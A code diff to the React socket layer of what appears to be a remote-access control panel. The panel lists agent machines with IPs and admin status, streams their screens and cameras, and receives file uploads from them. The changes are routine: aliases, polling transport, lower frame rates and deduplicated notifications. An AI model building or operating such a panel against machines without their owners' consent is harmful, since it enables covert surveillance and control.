@@ -7,6 +7,8 @@ import { toast } from 'sonner';
 interface Agent {
   id: string;
   name: string;
+  alias?: string;
+  rawName?: string;
   status: 'online' | 'offline';
   platform: string;
   ip: string;
@@ -201,6 +203,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [streamsActiveCount, setStreamsActiveCount] = useState<number>(0);
   const [commandsExecutedCount, setCommandsExecutedCount] = useState<number>(0);
   const lastEmitRef = useRef<Record<string, number>>({});
+  const lastPrivilegeRef = useRef<Record<string, { is_admin: boolean; ts: number }>>({});
   const [lastActivity, _setLastActivity] = useState<{ type: string; details?: string; agentId?: string | null; timestamp?: number }>(() => {
     try {
       const raw = localStorage.getItem('nch:lastActivity');
@@ -318,8 +321,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       socketInstance = io(socketUrl, {
         withCredentials: true,
         path: '/socket.io',
-        transports: ['websocket', 'polling'],
-        upgrade: true,
+        transports: ['polling'],
+        upgrade: false,
         perMessageDeflate: { threshold: 1024 },
         forceNew: true,
         timeout: 20000,
@@ -463,9 +466,13 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
             }
           }
           
+          const rawName = (typeof data?.name === 'string' && data.name.trim()) ? data.name : `Agent-${id.slice(0, 8)}`;
+          const alias = (typeof data?.alias === 'string' && data.alias.trim()) ? data.alias : undefined;
           return {
             id,
-            name: typeof data?.name === 'string' && data.name.trim() ? data.name : `Agent-${id.slice(0, 8)}`,
+            name: alias || rawName,
+            alias,
+            rawName,
             status: isOnline ? 'online' : 'offline',
             platform: typeof data?.platform === 'string' && data.platform.trim() ? data.platform : 'Unknown',
             ip: typeof data?.ip === 'string' && data.ip.trim() ? data.ip : '127.0.0.1',
@@ -498,12 +505,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
                   const raw = localStorage.getItem(`stream:last:${sel}`);
                   const saved = raw ? JSON.parse(raw) : {};
                   if (socket && saved?.screen) {
-                    socket.emit('set_stream_mode', { agent_id: sel, type: 'screen', mode: 'buffered', fps: 20, buffer_frames: 40 });
-                    apiClient.startStream(sel, 'screen', 'medium', 'buffered', 20, 40);
+                    socket.emit('set_stream_mode', { agent_id: sel, type: 'screen', mode: 'buffered', fps: 5, buffer_frames: 10 });
+                    apiClient.startStream(sel, 'screen', 'medium', 'buffered', 5, 10);
                   }
                   if (socket && saved?.camera) {
-                    socket.emit('set_stream_mode', { agent_id: sel, type: 'camera', mode: 'buffered', fps: 20, buffer_frames: 40 });
-                    apiClient.startStream(sel, 'camera', 'medium', 'buffered', 20, 40);
+                    socket.emit('set_stream_mode', { agent_id: sel, type: 'camera', mode: 'buffered', fps: 5, buffer_frames: 10 });
+                    apiClient.startStream(sel, 'camera', 'medium', 'buffered', 5, 10);
                   }
                 } catch {}
               } else {
@@ -517,11 +524,31 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       }
     });
 
+    socketInstance.on('agent_alias_update', (data: { agent_id: string; alias: string }) => {
+      try {
+        const { agent_id, alias } = data || ({} as any);
+        if (!agent_id || typeof alias !== 'string') return;
+        setAgents(prev => prev.map(a => 
+          a.id === agent_id 
+            ? { ...a, alias: alias || undefined, name: (alias || a.rawName || a.name) } 
+            : a
+        ));
+        toast.success(`Alias updated for ${agent_id}`, { description: alias || '(cleared)' });
+        addCommandOutput(`Alias set: ${agent_id} -> ${alias}`);
+      } catch (e) {}
+    });
     // Handle real-time privilege updates
     socketInstance.on('agent_privilege_update', (data: { agent_id: string; is_admin: boolean; timestamp: number }) => {
       try {
         console.log('🔍 SocketProvider: Received agent_privilege_update:', data);
         const { agent_id, is_admin, timestamp } = data;
+        
+        const now = Date.now();
+        const prev = lastPrivilegeRef.current[agent_id];
+        if (prev && prev.is_admin === is_admin && (now - prev.ts) < 5000) {
+          return;
+        }
+        lastPrivilegeRef.current[agent_id] = { is_admin, ts: now };
         
         setAgents(prevAgents => 
           prevAgents.map(agent => 
@@ -531,13 +558,15 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
           )
         );
         
-        const privilegeText = is_admin ? 'Administrator' : 'Standard user';
-        const rawAgentId = typeof agent_id === 'string' ? agent_id : String(agent_id ?? '');
-        const displayAgentId = rawAgentId.length > 32
-          ? `${rawAgentId.slice(0, 8)}…${rawAgentId.slice(-4)}`
-          : (rawAgentId || 'Unknown');
-        toast.info(`Agent privilege updated: ${displayAgentId} is now ${privilegeText}`);
-        addCommandOutput(`Privilege update: Agent ${displayAgentId} changed to ${privilegeText}`);
+        if (!prev || prev.is_admin !== is_admin) {
+          const privilegeText = is_admin ? 'Administrator' : 'Standard user';
+          const rawAgentId = typeof agent_id === 'string' ? agent_id : String(agent_id ?? '');
+          const displayAgentId = rawAgentId.length > 32
+            ? `${rawAgentId.slice(0, 8)}…${rawAgentId.slice(-4)}`
+            : (rawAgentId || 'Unknown');
+          toast.info(`Agent privilege updated: ${displayAgentId} is now ${privilegeText}`);
+          addCommandOutput(`Privilege update: Agent ${displayAgentId} changed to ${privilegeText}`);
+        }
         
       } catch (error) {
         console.error('Error processing agent privilege update:', error);
@@ -1085,8 +1114,11 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     // Upload progress events (with slide notifications)
     const lastProgress: Record<string, number> = {};
     socketInstance.on('file_upload_progress', (data: any) => {
-      console.log(`📊 Upload progress (from agent): ${data.filename} - ${data.progress}%`);
-      const event = new CustomEvent('file_upload_progress', { detail: { ...data, source: data?.source || 'agent' } });
+      try {
+        if (Array.isArray(data) && data.length > 0) data = data[0];
+      } catch {}
+      console.log(`📊 Upload progress (from agent): ${data?.filename} - ${data?.progress}%`);
+      const event = new CustomEvent('file_upload_progress', { detail: { ...(Array.isArray(data) ? (data[0] || {}) : (data || {})), source: (Array.isArray(data) ? (data[0]?.source) : data?.source) || 'agent' } });
       window.dispatchEvent(event);
       try {
         const key = `${data?.agent_id || ''}:${data?.upload_id || data?.filename || ''}`;
@@ -1104,9 +1136,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     });
     
     socketInstance.on('file_upload_complete', (data: any) => {
-      console.log(`✅ Upload complete (from agent): ${data.filename} (${data.size} bytes)`);
-      addCommandOutput(`✅ Uploaded: ${data.filename} (${data.size} bytes)`);
-      const event = new CustomEvent('file_upload_complete', { detail: { ...data, source: data?.source || 'agent' } });
+      try {
+        if (Array.isArray(data) && data.length > 0) data = data[0];
+      } catch {}
+      console.log(`✅ Upload complete (from agent): ${data?.filename} (${data?.size} bytes)`);
+      addCommandOutput(`✅ Uploaded: ${data?.filename} (${data?.size} bytes)`);
+      const event = new CustomEvent('file_upload_complete', { detail: { ...(Array.isArray(data) ? (data[0] || {}) : (data || {})), source: (Array.isArray(data) ? (data[0]?.source) : data?.source) || 'agent' } });
       window.dispatchEvent(event);
       try {
         const src = String(data?.source || 'agent');
